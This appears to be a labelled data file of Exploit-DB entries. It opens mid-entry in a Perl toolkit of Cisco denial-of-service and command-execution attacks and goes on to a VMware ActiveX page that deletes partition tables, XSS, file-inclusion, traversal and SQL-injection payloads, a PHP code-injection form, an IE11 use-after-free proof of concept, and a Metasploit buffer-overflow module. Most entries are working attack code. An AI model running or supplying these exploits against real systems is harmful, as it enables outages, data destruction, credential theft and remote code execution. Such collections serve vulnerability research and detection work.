PeerPort => 80,                                                      Type => SOCK_STREAM,                                                      Timeout => 5);                                                      unless($sockd){die ""No http server detected on $serv ...\n\n""}   $sockd->autoflush(1);   $sockd -> send($_[0]);   while(<$sockd>){$wr .= $_} $wrf = $wr;   close $sockd;   }   exit(1); }  sub cisco5 # Cisco Catalyst SSH Protocol Mismatch Denial of Service Vulnerability {   my $serv = $host;   my $port = 22;   my $vuln = ""a%a%a%a%a%a%a%"";     my $sockd = IO::Socket::INET->new (                                      PeerAddr => $serv,                                      PeerPort => $port,                                      Proto => ""tcp"")                                      || die ""No ssh server detected on $serv ...\n\n"";    print ""Packet sent ...\n"";   print $sockd ""$vuln"";   close($sockd);   exit(1); }  sub cisco6 # Cisco 675 Web Administration Denial of Service Vulnerability {   my $serv = $host;   my $port = 80;   my $vuln = ""GET ? HTTP/1.0\n\n"";     my $sockd = IO::Socket::INET->new (                                      PeerAddr => $serv,                                      PeerPort => $port,                                      Proto => ""tcp"")                                      || die ""No http server detected on $serv ...\n\n"";    print ""Packet sent ...\n"";   print $sockd ""$vuln"";   sleep(2);   print ""\nServer response :\n\n"";   close($sockd);   exit(1); }  sub cisco7 # Cisco Catalyst 3500 XL Remote Arbitrary Command Vulnerability {   my $serv = $host;   my $port = 80;   my $k = """";      print ""Enter a file to read [ /show/config/cr set as default ] : "";   $k = <STDIN>;   chomp ($k);   if ($k eq """")   {$vuln = ""GET /exec/show/config/cr HTTP/1.0\n\n"";}   else   {$vuln = ""GET /exec$k HTTP/1.0\n\n"";}    my $sockd = IO::Socket::INET->new (                                      PeerAddr => $serv,                                      PeerPort => $port,                                      Proto => ""tcp"")                                      || die ""No http server detected on $serv ...\n\n"";    print ""Packet sent ...\n"";   print $sockd ""$vuln"";   sleep(2);   print ""\nServer response :\n\n"";   while (<$sockd>){print}   close($sockd);   exit(1); }  sub cisco8 # Cisco IOS Software HTTP Request Denial of Service Vulnerability {   my $serv = $host;   my $port = 80;   my $vuln = ""GET /error?/ HTTP/1.0\n\n"";    my $sockd = IO::Socket::INET->new (                                      PeerAddr => $serv,                                      PeerPort => $port,                                      Proto => ""tcp"")                                      || die ""No http server detected on $serv ...\n\n"";    print ""Packet sent ...\n"";   print $sockd ""$vuln"";   sleep(2);   print ""\nServer response :\n\n"";   while (<$sockd>){print}   close($sockd);   exit(1); }  sub cisco9 # Cisco 514 UDP Flood Denial of Service Vulnerability {   my $ip = $host;   my $port = ""514"";   my $ports = """";   my $size = """";   my $i = """";   my $string = ""%%%%%XX%%%%%"";    print ""Input packets size : "";   $size = <STDIN>;   chomp($size);    socket(SS, PF_INET, SOCK_DGRAM, 17);   my $iaddr = inet_aton(""$ip"");    for ($i=0; $i<10000; $i++)   { send(SS, $string, $size, sockaddr_in($port, $iaddr)); }    printf ""\nPackets sent ...\n"";   sleep(2);   printf ""Please enter a server's open port : "";   $ports = <STDIN>;   chomp $ports;   printf ""\nNow checking server status ...\n"";   sleep(2);    socket(SO, PF_INET, SOCK_STREAM, getprotobyname('tcp')) || die ""An error occuring while loading socket ...\n\n"";   my $dest = sockaddr_in ($ports, inet_aton($ip));   connect (SO, $dest) || die ""Vulnerability successful exploited. Target server is down ...\n\n"";    printf ""Vulnerability unsuccessful exploited. Target server is still up ...\n\n"";   exit(1); }  sub cisco10 # CiscoSecure ACS for Windows NT Server Denial of Service Vulnerability {   my $ip = $host;   my $vln = ""%%%%%XX%%%%%"";   my $num = 30000;   my $string .= $vln x $num;   my $shc=""\015\012"";    my $sockd = IO::Socket::INET->new (                                      Proto => ""tcp"",                                      PeerAddr => $ip,                                      PeerPort => ""(2002)"",                                     ) || die ""Unable to connect to $ip:2002 ...\n\n"";    $sockd->autoflush(1);   print $sockd ""$string"" . $shc;   while (<$sockd>){ print }   print ""Packet sent ...\n"";   close($sockd);   sleep(1);   print(""Now checking server's status ...\n"");   sleep(2);    my $sockd2 = IO::Socket::INET->new (                                       Proto=>""tcp"",                                       PeerAddr=>$ip,                                       PeerPort=>""(2002)"",);                                       unless ($sockd){die ""Vulnerability successful exploited. Target server is down ...\n\n""};    print(""Vulnerability unsuccessful exploited. Target server is still up ...\n\n"");   exit(1); }  sub cisco11 # Cisco Catalyst Memory Leak Vulnerability {   my $serv = $host;   my $rep = """";   my $str = ""AAA\n"";    print ""\nInput the number of repetitions : "";   $rep = <STDIN>;   chomp $rep;     my $sockd = IO::Socket::INET->new (                                      PeerAddr => $serv,                                      PeerPort => ""(23)"",                                      Proto => ""tcp"")                                      || die ""No telnet server detected on $serv ...\n\n"";    for ($k=0; $k<=$rep; $k++) {                                 print $sockd ""$str"";                                 sleep(1);                                 print $sockd ""$str"";                                 sleep(1);                              }   close($sockd);   print ""Packet sent ...\n"";   sleep(1);   print(""Now checking server's status ...\n"");   sleep(2);      my $sockd2 = IO::Socket::INET->new (                                       Proto=>""tcp"",                                       PeerAddr=>$serv,                                       PeerPort=>""(23)"",);                                       unless ($sockd2){die ""Vulnerability successful exploited. Target server is down ...\n\n""};    print ""Vulnerability unsuccessful exploited. Target server is still up after $rep logins ...\\n"";   close($sockd2);   exit(1); }  sub cisco12 # Cisco CatOS CiscoView HTTP Server Buffer Overflow Vulnerability {   my $serv = $host;   my $l =100;   my $vuln = """";   my $long = ""A"" x $l;    my $sockd = IO::Socket::INET->new (                                      PeerAddr => $serv,                                      PeerPort => ""(80)"",                                      Proto => ""tcp"")                                      || die ""No http server detected on $serv ...\n\n"";    for ($k=0; $k<=50; $k++) {                               my $vuln = ""GET "" . $long . "" HTTP/1.0\n\n"";                               print $sockd ""$vuln\n\n"";                               sleep(1);                               $l = $l + 100;                            }    close($sockd);   print ""Packet sent ...\n"";   sleep(1);   print(""Now checking server's status ...\n"");   sleep(2);    my $sockd2 = IO::Socket::INET->new (                                       Proto=>""tcp"",                                       PeerAddr=>$serv,                                       PeerPort=>""http(80)"",);                                       unless ($sockd2){die ""Vulnerability successful exploited. Target server is down ...\n\n""};    print ""Target is not vulnerable. Server is still up after 5 kb of buffer ...)\n"";   close($sockd2);   exit(1); }  sub cisco13 # %u Encoding IDS Bypass Vulnerability (UTF) {   my $serv = $host;   my $vuln = ""GET %u002F HTTP/1.0\n\n"";    my $sockd = IO::Socket::INET->new (                                      PeerAddr => $serv,                                      PeerPort => ""(80)"",                                      Proto => ""tcp"")                                      || die ""No http server detected on $serv ...\n\n"";    print ""Packet sent ...\n"";   print $sockd ""$vuln"";   close($sockd);   sleep(1);   print(""Now checking server's status ...\n"");   print(""Please verify if directory has been listed ...\n\n"");   print(""Server response :\n"");   sleep(2);   while (<$sockd>){ print }   exit(1); }  sub cisco14 # Cisco IOS HTTP server DoS Vulnerability {   my $serv = $host;   my $vuln = ""GET /TEST?/ HTTP/1.0"";    my $sockd = IO::Socket::INET->new (                                      Proto=>""tcp"",                                      PeerAddr=>$serv,                                      PeerPort=>""http(80)"",);                                      unless ($sockd){die ""No http server detected on $serv ...\n\n""};    print $sockd ""$vuln\n\n"";   print ""Packet sent ...\n"";   close($sockd);   sleep(1);   print(""Now checking server's status ...\n"");   sleep(2);    my $sockd2 = IO::Socket::INET->new (                                       Proto=>""tcp"",                                       PeerAddr=>$serv,                                       PeerPort=>""http(80)"",);                                       unless ($sockd2){die ""Vulnerability successful exploited. Target server is down ...\n\n""};    print(""Vulnerability unsuccessful exploited. Target server is still up ...\n\n"");   close($sockd2);   exit(1); }",Cisco Secure IDS,1
2195,"VMware 5.5.1 - COM Object Arbitrary Partition Table Delete <!--  [XSec-06-05]: VMware 5.5.1 for Windows arbitrary partition table delete issue.  Advisory ID: XSec-06-05  Advisory Name:     VMware 5.5.1 for Windows arbitrary partition table delete issue.  Release Date:       08/16/2006  Tested on:         VMware 5.5.1 build-19175 on Windows Server 2000/2003  Affected version:   VMware 5.5.1  Author: nop <nop#xsec.org> http://www.xsec.org  Overview:  On running windows system, you can't delete, format and change system dirver. \ VMware register a COM Object use for Virtual Disk, but it's very danger. \ I don't know how to name this issue. If you allow unsafe ActiveX and jscript, \ and has VMware installed, the vmware.htm will delete all harddisk partition \ table on the windows system. please backup your partition table first.  Exploit:  =============== vmware.htm start ================   // VMware 5.5.1 for Windows arbitrary partition table delete issue. // Tested on Windows Server 2000/2003 // // nop nop#xsec.org // http://www.xsec.org //  // CLSID: {0F748FDE-0597-443C-8596-71854C5EA20A} // Info: Vie2Locator Class // ProgID: VieLib2.Vie2Locator.1 // InprocServer32: C:\Program Files\Common Files\VMware\VMware Virtual Image Editing\vielib.dll  -->  <html><body> <object classid=""clsid:{0F748FDE-0597-443C-8596-71854C5EA20A}"" id=""vmware""> </object> <script>  var disk = 0;                              // HardDisk No  while (disk < 20) {     var x = vmware.ConnectDisk(disk);  // Connect to HardDisk     x.ResetLayout();                   // Will clean all partition table on your Harddisk        disk += 1; } </script> </body></html>  # milw0rm.com [2006-08-16]",VMware,1
30415,"Cisco EPC3925 - Persistent Cross-Site Scripting #######################################################################  # Exploit Title: Cisco EPC3925 - Persistent Cross Site Scripting   # Google Dork: N/A   # Date: 12-11-2013   # Exploit Author: Jeroen - IT Nerdbox   # Vendor Homepage: http://www.cisco.com   # Software Link: Not public   # Version: epc3925-E10-5-v302r125572-130520c   # Tested on: Cisco EPC3925   # CVE: N/A  #######################################################################  # Description  # The parameter DdnsHostName is vulnerable to Persistent Cross Site Scripting.   # However, there is client side input validation, which can easily be bypassed.  #  # Location:  #  # POST http://[target]/goform/Setup_DDNS   #   # Parameters:  #  #DdnsService=0&DdnsUserName=xxx&DdnsPassword=****&DdnsHostName=<Enter Payload Here>&save=Save+Settings   #   # Payload   #   # PoC: ""><input onmouseover=prompt(document.cookie)>  #  # Check out the video at: http://www.nerdbox.it/cisco-epc3925-persistent-xss/",Cisco EPC3925,1
30022,PHP Multi User Randomizer 2006.09.13 - 'Configure_Plugin.TPL.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/23917/info  PHP Multi User Randomizer is prone to a cross-site scripting vulnerability because the application fails to properly sanitize user-supplied input.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.   http://www.example.com/web/configure_plugin.tpl.php?edit_plugin==[xss],PHP Multi User Randomizer,1
17295,Vanilla Forum 2.0.17.9 - Local File Inclusion ------------------------------------------------------------------------ Software................Vanilla Forum 2.0.17.9 Vulnerability...........Local File Inclusion Threat Level............Critical (4/5) Download................http://www.vanillaforums.com/ Discovery Date..........5/15/2011 Tested On...............Windows Vista + XAMPP ------------------------------------------------------------------------ Author..................AutoSec Tools Site....................http://www.autosectools.com/ Email...................John Leitch <john@autosectools.com> ------------------------------------------------------------------------   --Description--  A local file inclusion vulnerability in Vanilla Forum 2.0.17.9 can be exploited to include arbitrary files.   --PoC--  http://localhost/vanilla/index.php?p=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini%00,Vanilla Forum,1
7436,"the net guys aspired2blog - SQL Injection / File Disclosure ######################################################### --------------------------------------------------------- Portal Name: ASPIred2Blog Vendor : http://thenetguys.us/Home/Blog.asp Author : Pouya_Server , Pouya.s3rver@Gmail.com Vulnerability : (SQL,DD) --------------------------------------------------------- ######################################################### [DD]: http://site.com/[Path]/admin/blog.mdb   [SQL]: http://site.com/[Path]/admin/blog_comments.asp?BlogID='[SQL]   --------------------------------- Victem : http://thenetguys.us/ASPired2/Blog/index.asp  # milw0rm.com [2008-12-12]",the net guys aspired2blog,1
43368,"Microsoft Internet Explorer 11 - 'jscript!JSONStringifyObject' Use-After-Free <!-- Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1381  There is a use-after-free in jscript.dll library that can be exploited in IE11.  PoC:  ========================================= -->  <!-- saved from url=(0014)about:internet --> <meta http-equiv=""X-UA-Compatible"" content=""IE=8""></meta> <script language=""Jscript.Encode"">  var o1 = {toJSON:function(){   alert('o1');   return [o2]; }}  var o2 = {toJSON:function(){   alert('o2');   CollectGarbage();   return 'x'; }}  JSON.stringify(o1);  </script>  <!-- =========================================  Technical details:   JSONStringifyObject first calls JSONApplyFilters which calls an argument's toString method. However the return value of the toString method won't be on the garbage collector's root object list and thus can be freed during subsequent callbacks.  Debug log:  =========================================  0:028> g (df8.e48): Access violation - code c0000005 (first chance) First chance exceptions are reported before any exception handling. This exception may be expected and handled. jscript!JSONStringifyArray+0x38f: 000007fe`edbf9fb3 66214738        and     word ptr [rdi+38h],ax ds:00000000`04518fc8=????  0:014> r rax=000000000000fffb rbx=0000000000000000 rcx=0000000000000005 rdx=0000000000000005 rsi=00000000129ca100 rdi=0000000004518f90 rip=000007feedbf9fb3 rsp=00000000129c9f30 rbp=00000000129c9fa9  r8=0000000000000000  r9=000000000405d670 r10=0000000000000081 r11=00000000129c9f00 r12=0000000000000001 r13=0000000000000001 r14=0000000000000000 r15=00000000129ca1a8 iopl=0         nv up ei pl nz na pe nc cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010202 jscript!JSONStringifyArray+0x38f: 000007fe`edbf9fb3 66214738        and     word ptr [rdi+38h],ax ds:00000000`04518fc8=????  0:014> k  # Child-SP          RetAddr           Call Site 00 00000000`129c9f30 000007fe`edbfa2cc jscript!JSONStringifyArray+0x38f 01 00000000`129ca000 000007fe`edbfec94 jscript!JSONStringifyObject+0x2dc 02 00000000`129ca0b0 000007fe`edb9c2ec jscript!JsJSONStringify+0x3e4 03 00000000`129ca190 000007fe`edb9a9fe jscript!NatFncObj::Call+0x138 04 00000000`129ca240 000007fe`edb9b234 jscript!NameTbl::InvokeInternal+0x3f8 05 00000000`129ca360 000007fe`edb99852 jscript!VAR::InvokeByName+0x81c 06 00000000`129ca570 000007fe`edb99929 jscript!VAR::InvokeDispName+0x72 07 00000000`129ca5f0 000007fe`edb924b8 jscript!VAR::InvokeByDispID+0x1229 08 00000000`129ca640 000007fe`edb98ec2 jscript!CScriptRuntime::Run+0x5a6 09 00000000`129cb440 000007fe`edb98d2b jscript!ScrFncObj::CallWithFrameOnStack+0x162 0a 00000000`129cb650 000007fe`edb98b95 jscript!ScrFncObj::Call+0xb7 0b 00000000`129cb6f0 000007fe`edb9e6c0 jscript!CSession::Execute+0x19e 0c 00000000`129cb7c0 000007fe`edba70e7 jscript!COleScript::ExecutePendingScripts+0x17a 0d 00000000`129cb890 000007fe`edba68d6 jscript!COleScript::ParseScriptTextCore+0x267 0e 00000000`129cb980 000007fe`ee2f5251 jscript!COleScript::ParseScriptText+0x56 0f 00000000`129cb9e0 000007fe`eea7b320 MSHTML!CActiveScriptHolder::ParseScriptText+0xc1 10 00000000`129cba60 000007fe`ee2f6256 MSHTML!CScriptCollection::ParseScriptText+0x37f 11 00000000`129cbb40 000007fe`ee2f5c8e MSHTML!CScriptData::CommitCode+0x3d9 12 00000000`129cbd10 000007fe`ee2f5a11 MSHTML!CScriptData::Execute+0x283 13 00000000`129cbdd0 000007fe`eeab46fb MSHTML!CHtmScriptParseCtx::Execute+0x101 14 00000000`129cbe10 000007fe`ee398a5b MSHTML!CHtmParseBase::Execute+0x235 15 00000000`129cbeb0 000007fe`ee272e39 MSHTML!CHtmPost::Broadcast+0x90 16 00000000`129cbef0 000007fe`ee2ccaef MSHTML!CHtmPost::Exec+0x4bb 17 00000000`129cc100 000007fe`ee2cca40 MSHTML!CHtmPost::Run+0x3f 18 00000000`129cc130 000007fe`ee2cda12 MSHTML!PostManExecute+0x70 19 00000000`129cc1b0 000007fe`ee2d0843 MSHTML!PostManResume+0xa1 1a 00000000`129cc1f0 000007fe`ee2b6fc7 MSHTML!CHtmPost::OnDwnChanCallback+0x43 1b 00000000`129cc240 000007fe`eeae4f78 MSHTML!CDwnChan::OnMethodCall+0x41 1c 00000000`129cc270 000007fe`ee1d9d75 MSHTML!GlobalWndOnMethodCall+0x240 1d 00000000`129cc310 00000000`771f9bbd MSHTML!GlobalWndProc+0x150 1e 00000000`129cc390 00000000`771f98c2 USER32!UserCallWinProcCheckWow+0x1ad 1f 00000000`129cc450 000007fe`f2694a87 USER32!DispatchMessageWorker+0x3b5 20 00000000`129cc4d0 000007fe`f269babb IEFRAME!CTabWindow::_TabWindowThreadProc+0x555 21 00000000`129cf750 000007fe`fe4c572f IEFRAME!LCIETab_ThreadProc+0x3a3 22 00000000`129cf880 000007fe`efb2925f iertutil!_IsoThreadProc_WrapperToReleaseScope+0x1f 23 00000000`129cf8b0 00000000`772f59cd IEShims!NS_CreateThread::DesktopIE_ThreadProc+0x9f 24 00000000`129cf900 00000000`7742a561 kernel32!BaseThreadInitThunk+0xd 25 00000000`129cf930 00000000`00000000 ntdll!RtlUserThreadStart+0x1d  0:014> !heap -p -a 00000000`04518fc8     address 0000000004518fc8 found in     _DPH_HEAP_ROOT @ 3d31000     in free-ed allocation (  DPH_HEAP_BLOCK:         VirtAddr         VirtSize)                                     3d49750:          4518000             2000     000007feefb88726 verifier!AVrfDebugPageHeapFree+0x00000000000000a2     00000000774c4255 ntdll!RtlDebugFreeHeap+0x0000000000000035     000000007746797c ntdll! ?? ::FNODOBFM::`string'+0x000000000000e982     000007fefd4b10c8 msvcrt!free+0x000000000000001c     000007feedb9bad2 jscript!NativeErrorProtoObj<16>::`vector deleting destructor'+0x0000000000000022     000007feedb9b938 jscript!NameTbl::SetMasterVariant+0x000000000000a240     000007feedbb42cb jscript!GcAlloc::ReclaimGarbage+0x000000000000034d     000007feedb919e2 jscript!GcContext::Reclaim+0x00000000000000ae     000007feedba1956 jscript!GcContext::CollectCore+0x000000000000018b     000007feedba17a5 jscript!GcContext::Collect+0x0000000000000025     000007feedbe42f3 jscript!JsCollectGarbage+0x0000000000000023     000007feedb9c2ec jscript!NatFncObj::Call+0x0000000000000138     000007feedb9c199 jscript!NameTbl::InvokeInternal+0x0000000000000377     000007feedb986ea jscript!VAR::InvokeByDispID+0xffffffffffffffea     000007feedb924b8 jscript!CScriptRuntime::Run+0x00000000000005a6     000007feedb98ec2 jscript!ScrFncObj::CallWithFrameOnStack+0x0000000000000162     000007feedb98d2b jscript!ScrFncObj::Call+0x00000000000000b7     000007feedbc2084 jscript!NameTbl::InvokeInternal+0x000000000000060f     000007feedb986ea jscript!VAR::InvokeByDispID+0xffffffffffffffea     000007feedbf8ee3 jscript!GCProtectKeyAndCall+0x000000000000009f     000007feedbf97a6 jscript!JSONApplyFilters+0x000000000000014a     000007feedbfa08b jscript!JSONStringifyObject+0x000000000000009b     000007feedbf9e77 jscript!JSONStringifyArray+0x0000000000000253     000007feedbfa2cc jscript!JSONStringifyObject+0x00000000000002dc     000007feedbfec94 jscript!JsJSONStringify+0x00000000000003e4     000007feedb9c2ec jscript!NatFncObj::Call+0x0000000000000138     000007feedb9a9fe jscript!NameTbl::InvokeInternal+0x00000000000003f8     000007feedb9b234 jscript!VAR::InvokeByName+0x000000000000081c     000007feedb99852 jscript!VAR::InvokeDispName+0x0000000000000072     000007feedb99929 jscript!VAR::InvokeByDispID+0x0000000000001229     000007feedb924b8 jscript!CScriptRuntime::Run+0x00000000000005a6     000007feedb98ec2 jscript!ScrFncObj::CallWithFrameOnStack+0x0000000000000162  ========================================= -->",Microsoft Internet Explorer,1
20926,"Linux Man Page 6.1/6.2/7.0/7.1- Source Buffer Overflow source: https://www.securityfocus.com/bid/2872/info  A buffer overflow vulnerability exists in the implementation of the 'man' system manual pager program commonly included with Linux distributions.  The vulnerability exists due to the way the program handles manual page files beginning with a '.so' statement. Under certain circumstances, the code responsible for processing this data may be allow the length of the filename from a '.so' statement to be expanded, eventually causing a boundary condition error.  As a result, it may be possible for local users to execute arbitrary code with group 'man' privileges.   https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/20926.tar.gz",Linux Man Page,1
38737,Twilight CMS - DeWeS Web Server Directory Traversal source: https://www.securityfocus.com/bid/61906/info  Twilight CMS is prone to a directory-traversal vulnerability because it fails to properly sanitize user-supplied input.  Remote attackers can use specially crafted requests with directory-traversal sequences ('../') to retrieve arbitrary files in the context of the application.  Exploiting this issue may allow an attacker to obtain sensitive information that could aid in further attacks.  Twilight CMS 0.4.2 is vulnerable; other versions may also be affected.   nc [www.example.com] 80 GET /..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/windows/win.ini HTTP/1.1  nc [www.example.com] 80 GET demosite/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/TwilightCMS/Sites/company_site/Data/user list.dat HTTP/1.1,Twilight CMS,1
6530,"OpenElec 3.01 - 'obj' Local File Inclusion   :::::::-.   ...    ::::::.    :::.    ;;,   `';, ;;     ;;;`;;;;,  `;;;    `[[     [[[['     [[[  [[[[[. '[[     $$,    $$$$      $$$  $$$ ""Y$c$$     888_,o8P'88    .d888  888    Y88     MMMMP""`   ""YmmMMMM""""  MMM     YM     [ Discovered by dun \ dun[at]strcpy.pl ]   #################################################################  #  [ OpenElec <= v3.01 ]   Local File Inclusion Vulnerability   #  #################################################################  #  # Script site: http://www.openelec.org/  # Download: http://adullact.net/frs/?group_id=434  #  # Vuln:   # http://site.com/openelec/scr/form.php?obj=../../../../../../../etc/passwd%00  #        #  # Bug: ./openelec/scr/form.php (lines: 27-32)  #  # ...  # 	$obj = """";  #	if (isset ($_GET ['obj']))  #		$obj = $_GET ['obj'];  #	//  #  	if (file_exists (""../obj/"".$obj."".class.php""))  #       include (""../obj/"".$obj."".class.php"");	        // * LFI *  # ... 			      #  #  ###############################################  # Greetz: D3m0n_DE * str0ke * and otherz..  ###############################################   [ dun / 2008 ]   *******************************************************************************************  # milw0rm.com [2008-09-22]",OpenElec,1
5736,"1Book Guestbook Script 1.0.1 - Code Execution ========================================================= =============== JIKI TEAM [ Maroc And YameN ]=============== ========================================================= # Author  : jiko # email  : jalikom@hotmail.fr # Home   : www.no-back.org & no-exploit.com # Script  : 1Book Guestbook Script # Bug   : remote code execution # Download  : http://1scripts.net/scripts/1book.zip =========================JIkI Team===================   # if(in_array($_POST['username'], $bannedusers))  # echo 'Your username has been banned by the administrator.<br/><br/>';  # if(in_array($_SERVER['REMOTE_ADDR'], $bannedips))  # echo 'Your IP has been banned by the administrator.<br/><br/>';  # elseif($_POST['1'] + $_POST['2'] != $_POST['check'])  # echo('You answered the security question incorrectly.');  # else  # {  # $data = unserialize(file_get_contents('data.php'));  # array_push($data, array('user' => $_POST['username'], 'date' =>  mktime(), 'message' => $_POST['message'], 'website' =>  $_POST['website'], 'ip' => $_SERVER['REMOTE_ADDR']));  # file_put_contents('data.php', serialize($data));  # }  #  #}   #===========================================================================================================================#  # So, we can write a malicious code like <?php include($jiko); ?> in  the variable $message, and $username #  # and then we go in             http://Site/script/data/data.php?jiko=[shell]  #  #===========================================================================================================================#  simple exploit whith HTML:  -------------------------  change site by your site  +++++++++++++++++++++++++   <title> EXploit BY JIKO</title>  <center>  <form method=""post"" action=""site/guestbook.php"">  <input type=hidden name=username value=""jiko was here"" >  <input type=hidden name=message value=""<? include($jiko) ?>"" >  <input type=submit value=""send"">  </form>  <h5>a fter send your usage:  <br>http://site/scripts/data.php?jiko=[shell]</h5>    =========================================================  greetz:  all my friend [kil1er & GhosT HaCkEr & stack ] and H-T Team and all No-back members and tryag.Com  visit: www.no-back.org & www.tryag.com & no-exploit.com ========================================================= **************************  hello brother i want chnage my name Jiki Team to JiKo and my email to  jalikom@hotmail.fr  and this a news bug  remote code execution  # milw0rm.com [2008-06-03]",1Book Guestbook Script,1
16814,"Novell Groupwise Messenger Client - Remote Buffer Overflow (Metasploit) ## # $Id: groupwisemessenger_client.rb 9583 2010-06-22 19:11:05Z todb $ ##  ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # Framework web site for more information on licensing and terms of use. # http://metasploit.com/framework/ ##  class Metasploit3 < Msf::Exploit::Remote 	Rank = NormalRanking  	include Msf::Exploit::Remote::TcpServer  	def initialize(info = {}) 		super(update_info(info, 			'Name'           => 'Novell GroupWise Messenger Client Buffer Overflow', 			'Description'    => %q{ 					This module exploits a stack buffer overflow in Novell's GroupWise Messenger Client. 				By sending a specially crafted HTTP response, an attacker may be able to execute 				arbitrary code. 			}, 			'Author'         => 'MC', 			'License'        => MSF_LICENSE, 			'Version'        => '$Revision: 9583 $', 			'References'     => 				[ 					[ 'CVE', '2008-2703' ], 					[ 'OSVDB', '46041' ], 					[ 'BID', '29602' ], 					[ 'URL', 'http://www.infobyte.com.ar/adv/ISR-17.html' ], 				], 			'DefaultOptions' => 				{ 					'EXITFUNC' => 'process', 				}, 			'Payload'        => 				{ 					'Space'    => 750, 					'BadChars' => ""\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c"", 					'DisableNops'   =>  'True', 					'StackAdjustment' => -3500, 					'PrependEncoder' => ""\x81\xc4\xff\xef\xff\xff\x44"", 					'EncoderType'   => Msf::Encoder::Type::AlphanumUpper, 				}, 			'Platform'       => 'win', 			'Targets'        => 				[ 					[ 'Novell GroupWise Messenger 2.0 Client', { 'Ret' => 0x502de115 } ], 					[ 'Novell GroupWise Messenger 1.0 Client', { 'Ret' => 0x1000e105 } ], 				], 			'Privileged'     => false, 			'DisclosureDate' => 'Jul 2 2008', 			'DefaultTarget'  => 0))  		register_options( 			[ 				OptPort.new('SRVPORT', [ true, ""The daemon port to listen on."", 8300 ]) 			], self.class) 	end  	def on_client_connect(client) 		return if ((p = regenerate_payload(client)) == nil)  		client.get_once  		date = Time.gm(2008,nil,nil,nil,nil,nil) 		rand_1 = rand_text_english(5) 		rand_2 = rand_text_english(4) 		rand_3 = rand_text_english(rand(8) + 1) 		rand_4 = rand_text_alpha_upper(8) 		rand_5 = rand_text_english(3)  		res =  ""HTTP/1.0 200\r\n"" 		res << ""Date: #{date}\r\n"" 		res << ""Pragma: no-cache\r\n"" 		res << ""Cache-Control: no-cache\r\n\r\n"" 		res << ""\n\0\20\0\0\0nnmFileTransfer\0\2\0\0\x000\0\n\0\t\0\0\0"" 		res << ""nnmQuery\0\2\0\0\x001\0\n\0\13\0\0\0nnmArchive"" 		res << ""\0\2\0\0\x001\0\n\0\24\0\0\0nnmPasswordRemember"" 		res << ""\0\2\0\0\x001\0\n\0\17\0\0\0nnmMaxContacts"" 		res << ""\0\4\0\0\x00150\0\n\0\16\0\0\0nnmMaxFolders"" 		res << ""\0\3\0\0\x0050\0\n\0\r\0\0\0nnmBroadcast"" 		res << ""\0\2\0\0\x001\0\n\0\23\0\0\0nnmPersonalHistory"" 		res << ""\0\2\0\0\x001\0\n\0\r\0\0\0nnmPrintSave"" 		res << ""\0\2\0\0\x001\0\n\0\17\0\0\0nnmChatService"" 		res << ""\0\2\0\0\x001\0\n\0\3\0\0\0CN\0\a\0\0\0ISR000"" 		res << ""\0\n\0\b\0\0\0Surname\0\6\0\0\0#{rand_1}\0\n\0\n\0\0\0"" 		res << ""Full Name\0\20\0\0\0Client Name    \0\n\0\13\0\0\0Given Name"" 		res << ""\0\n\0\0\0Client   \0\n\0\r\0\0\0nnmLastLogin\0\13\0\0\x001200112090\0\t\0\30\0\0\0"" 		res << ""NM_A_FA_CLIENT_SETTINGS\0\1\0\0\0\n\0\21\0\0\0Novell.AskToSave"" 		res << ""\0\2\0\0\x001\0\t\0\e\0\0\0NM_A_FA_INFO_DISPLAY_ARRAY"" 		res << ""\0\1\0\0\0\n\0\27\0\0\0Internet EMail Address\0\26\0\0\0#{rand_1}\@#{rand_4}.#{rand_5}.xx"" 		res << ""\0\b\0\16\0\0\0NM_A_UD_BUILD\0\a\0\0\0\n\0\13\0\0\0NM_A_SZ_DN\x001\0\0\0"" 		res << ""CN=ISR000,OU=IT,OU=ISR_,OU=BA,OU=AR,O=#{rand_4}XX"" 		res << ""\0\t\0\24\0\0\0NM_A_FA_AU_SETTINGS\0\1\0\0\0\n\0\22\0\0\0"" 		res << ""nnmClientDownload\0\2\0\0\x000\0\b\0\22\0\0\0NM_A_UD_KEEPALIVE"" 		res << ""\0\n\0\0\0\n\0\24\0\0\0NM_A_SZ_RESULT_CODE\0\2\0\0\x000\0\n\0\27\0\0\0"" 		res << ""NM_A_SZ_TRANSACTION_ID\0\2\0\0\x001\0\0""  		res << ""HTTP/1.0 200\r\n"" 		res << ""Date: #{date}\r\n"" 		res << ""Pragma: no-cache\r\n"" 		res << ""Cache-Control: no-cache\r\n\r\n"" 		res << ""\n\0\24\0\0\0NM_A_SZ_RESULT_CODE\0\2\0\0\x000\0\n\0\27\0\0\0"" 		res << ""NM_A_SZ_TRANSACTION_ID\0\2\0\0\x00#{rand_2}\0\0"" 		res << make_nops(805 - payload.encoded.length) + payload.encoded 		res << Rex::Arch::X86.jmp_short(6) + make_nops(2) + [target.ret].pack('V') 		res << [0xe9, -800].pack('CV') + rand_text_english(5000 - payload.encoded.length)  		print_status(""Sending #{self.name} to #{client.peerhost}:#{client.peerport}..."") 		client.put(res) 		handler(client)  		select(nil,nil,nil,2) 		service.close_client(client) 	end  end",Novell Groupwise Messenger Client,1
